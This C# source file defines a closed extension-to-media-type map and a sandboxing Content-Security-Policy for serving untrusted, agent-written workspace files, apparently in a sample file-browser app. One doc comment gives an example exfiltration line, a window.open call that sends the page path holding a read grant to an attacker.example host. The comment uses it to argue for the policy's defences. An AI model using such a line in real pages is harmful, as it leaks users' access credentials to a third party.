namespace LmStreaming.Sample.FileBrowser;

/// <summary>
/// The CLOSED extension-to-media-type map the path-addressed raw workspace endpoint labels untrusted
/// workspace bytes with (Bug#15). Deliberately NOT ASP.NET Core's
/// <c>FileExtensionContentTypeProvider</c>: that table carries roughly 380 entries — <c>application/hta</c>,
/// <c>application/x-msdownload</c>, an XML type for <c>.xsl</c>, and much else — and nobody on this repo has
/// reviewed it as a policy for files an agent wrote. Here the list is short enough to read, and anything
/// absent from it is <see cref="Default"/>, which combined with <c>X-Content-Type-Options: nosniff</c> means
/// an unrecognised file is inert in the browser rather than guessed at.
/// </summary>
/// <remarks>
/// The map is a labelling decision, not an access decision: the raw endpoint serves any file the caller may
/// already read, because a rendered page has to be able to fetch its own stylesheet, script and font. What
/// this type decides is only how the browser is told to treat the bytes.
/// </remarks>
public static class WorkspaceContentTypes
{
    /// <summary>What an unrecognised extension is served as. Inert under <c>nosniff</c>.</summary>
    public const string Default = "application/octet-stream";

    /// <summary>
    /// The <c>Content-Security-Policy</c> every ACTIVE DOCUMENT response carries (see
    /// <see cref="IsActiveDocument"/>). The <c>sandbox</c> DIRECTIVE is the load-bearing control here, and it
    /// is a directive rather than an <c>&lt;iframe sandbox&gt;</c> attribute on purpose: a header travels
    /// with the response, so it applies identically when someone opens the raw URL as a TOP-LEVEL TAB, where
    /// no iframe attribute exists to protect anything. It gives the document an OPAQUE ORIGIN, so untrusted
    /// workspace HTML can never read this app's cookies, <c>localStorage</c> or bearer token, nor call
    /// <c>/api/*</c> with credentials.
    /// </summary>
    /// <remarks>
    /// <para>
    /// <c>allow-same-origin</c> is absent and must stay absent — that single token would hand the document
    /// the app's origin and undo everything above. The client pins its absence on the iframe attribute too.
    /// </para>
    /// <para>
    /// The other tokens are each doing a job: <c>allow-scripts</c> and <c>allow-forms</c> because a generated
    /// report that cannot run its own chart script or render a form is not a preview of that report;
    /// <c>allow-modals</c> because <c>alert()</c>/<c>confirm()</c> add annoyance, not reach — a document that
    /// already has <c>allow-scripts</c> can spin the CPU regardless, and dropping it silently breaks ordinary
    /// pages. <c>base-uri 'none'</c> stops the document rewriting its own base URL to somewhere its subresource
    /// requests — and, under the URL transport, the grant in its path — would be sent;
    /// <c>form-action 'none'</c> pairs with <c>allow-forms</c> so forms render but submit nowhere;
    /// <c>frame-ancestors 'self'</c> keeps this app the only framer.
    /// </para>
    /// <para>
    /// <c>allow-popups</c> is ABSENT, and it stays absent because this ONE string has to be safe for the
    /// WEAKER of the two grant transports. A sandboxed document can navigate itself or a popup anywhere and
    /// no CSP directive here stops it (<c>navigate-to</c> was removed from CSP3, and <c>default-src</c>
    /// governs fetches, not top-level navigations) — so whatever is in the document's own URL is
    /// exfiltrable by <c>window.open('https://attacker.example/?g=' + location.pathname)</c>. On a secure
    /// context that is now only <c>WorkspaceGrantService.CookieTransportMarker</c>, a public constant: the
    /// credential is an <c>HttpOnly</c> cookie the document's script cannot read, and a popup inherits the
    /// sandbox and its opaque origin so it cannot read it either. On the plain-http fallback, where the
    /// token IS the path segment, the original argument holds unchanged and a live read credential is what
    /// leaks. Losing the token costs a workspace page its <c>target="_blank"</c> links; opening the document
    /// full-size stays available as a button this app renders OUTSIDE the frame, where no workspace script
    /// can reach it.
    /// </para>
    /// </remarks>
    public const string SandboxPolicy =
        "sandbox allow-scripts allow-forms allow-modals; "
        + "default-src 'self' data: blob:; "
        + "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
        + "style-src 'self' 'unsafe-inline' data:; "
        + "img-src 'self' data: blob:; "
        + "font-src 'self' data:; "
        + "media-src 'self' data: blob:; "
        + "frame-ancestors 'self'; "
        + "base-uri 'none'; "
        + "form-action 'none'";

    /// <summary>
    /// The media types whose response MUST also carry the CSP <c>sandbox</c> header — every type from which a
    /// browser will execute script in a DOCUMENT context. A script or stylesheet subresource is not in here:
    /// it is fetched by a document that already carries its own CSP, and a <c>sandbox</c> directive on a
    /// subresource response neither travels to that document nor means anything on its own.
    /// </summary>
    /// <remarks>
    /// <c>application/pdf</c> was considered and deliberately excluded. A PDF can carry JavaScript, but
    /// Chrome's and Firefox's built-in viewers already run it isolated from the embedding page, while
    /// sandboxing the response degrades the viewer's own chrome (toolbar, download, print) that the user is
    /// there to use. Revisit if a deployment ever serves PDFs to a browser without an isolating viewer.
    /// </remarks>
    private static readonly HashSet<string> ActiveDocumentTypes = new(StringComparer.OrdinalIgnoreCase)
    {
        "text/html",
        "application/xhtml+xml",
        "image/svg+xml",
    };

    private static readonly Dictionary<string, string> ByExtension = new(StringComparer.OrdinalIgnoreCase)
    {
        // Documents. Each of these is an active document; see ActiveDocumentTypes.
        [".html"] = "text/html; charset=utf-8",
        [".htm"] = "text/html; charset=utf-8",
        [".xhtml"] = "application/xhtml+xml; charset=utf-8",
        [".svg"] = "image/svg+xml",
        // Subresources a rendered page loads by relative link — the reason this endpoint exists at all.
        [".css"] = "text/css; charset=utf-8",
        [".js"] = "text/javascript; charset=utf-8",
        [".mjs"] = "text/javascript; charset=utf-8",
        [".json"] = "application/json; charset=utf-8",
        [".map"] = "application/json; charset=utf-8",
        [".wasm"] = "application/wasm",
        // Images.
        [".png"] = "image/png",
        [".jpg"] = "image/jpeg",
        [".jpeg"] = "image/jpeg",
        [".gif"] = "image/gif",
        [".webp"] = "image/webp",
        [".bmp"] = "image/bmp",
        [".ico"] = "image/x-icon",
        [".avif"] = "image/avif",
        // Fonts.
        [".woff"] = "font/woff",
        [".woff2"] = "font/woff2",
        [".ttf"] = "font/ttf",
        [".otf"] = "font/otf",
        // Media.
        [".mp4"] = "video/mp4",
        [".webm"] = "video/webm",
        [".ogg"] = "audio/ogg",
        [".mp3"] = "audio/mpeg",
        [".wav"] = "audio/wav",
        // Inert text. Everything here renders as plain text under nosniff, so a `.txt` whose bytes open with
        // `<html>` stays text rather than being sniffed into a document.
        [".txt"] = "text/plain; charset=utf-8",
        [".md"] = "text/plain; charset=utf-8",
        [".markdown"] = "text/plain; charset=utf-8",
        [".log"] = "text/plain; charset=utf-8",
        [".csv"] = "text/plain; charset=utf-8",
        [".tsv"] = "text/plain; charset=utf-8",
        [".yaml"] = "text/plain; charset=utf-8",
        [".yml"] = "text/plain; charset=utf-8",
        // Opened by a plug-in/viewer rather than executed as a page.
        [".pdf"] = "application/pdf",
    };

    /// <summary>
    /// The media type for <paramref name="name"/>'s extension, or <see cref="Default"/> when the extension is
    /// absent or unlisted. Case-insensitive.
    /// </summary>
    public static string ForFileName(string name)
    {
        if (string.IsNullOrWhiteSpace(name))
        {
            return Default;
        }

        var ext = Path.GetExtension(name);
        return !string.IsNullOrEmpty(ext) && ByExtension.TryGetValue(ext, out var mapped) ? mapped : Default;
    }

    /// <summary>
    /// True when <paramref name="contentType"/> (with or without its <c>; charset=</c> parameter) names a
    /// document the browser executes script from, i.e. one whose response must carry the CSP
    /// <c>sandbox</c> directive that gives it an opaque origin.
    /// </summary>
    public static bool IsActiveDocument(string contentType)
    {
        if (string.IsNullOrWhiteSpace(contentType))
        {
            return false;
        }

        var semicolon = contentType.IndexOf(';');
        var essence = (semicolon < 0 ? contentType : contentType[..semicolon]).Trim();
        return ActiveDocumentTypes.Contains(essence);
    }
}
